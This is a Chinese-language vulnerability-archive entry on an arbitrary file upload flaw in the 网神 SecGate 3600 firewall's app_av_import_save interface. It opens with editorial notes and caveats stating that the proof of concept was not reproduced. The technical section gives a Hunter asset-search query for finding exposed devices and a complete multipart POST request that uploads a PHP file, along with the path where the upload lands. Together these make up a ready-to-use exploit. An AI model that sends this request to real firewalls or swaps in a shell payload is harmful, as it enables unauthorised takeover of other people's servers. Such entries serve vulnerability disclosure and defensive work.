---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "网神SecGata3600防火墙app_av_import_save任意文件上传漏洞"
product: "网神SecGate3600 app_av_import_save"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "缺版本认证和修复"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%BD%91%E7%A5%9ESecGata3600%E9%98%B2%E7%81%AB%E5%A2%99app_av_import_save%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "app.name="
hunter: "app.name=\"网神 SecGate\"&&web.title==\"网神SecGate 3600防火墙\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/uay6pavy9qt2qc29"
id: "vw-8cd8ae1c08e37a44ac442d7d"
entity_id: "ve-8cd8ae1c08e37a44ac442d7d"
schema_version: "1"
---

# 网神SecGata3600防火墙app_av_import_save任意文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：网神SecGate3600 app_av_import_save
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：缺版本认证和修复
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. SecGata拼错
2. Hunter误存FOFA且表达式截断
3. 与sys_hand_upfile是不同路由动作/字段，不无脑合并
4. 响应和执行判据未提供，PHP自删除须实际核验
5. 缺版本认证和修复
6. HTTP固定Content-Length需重算

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/uay6pavy9qt2qc29>

### 归档技术正文

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 app_av_import_save接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
    - hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
```plain
POST / HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 451
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="nhzwe1.php"
Content-Type: text/plain

<?php echo(md5(13123));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```


上传文件位置

```plain
/attachements/nhzwe1.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uay6pavy9qt2qc29>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
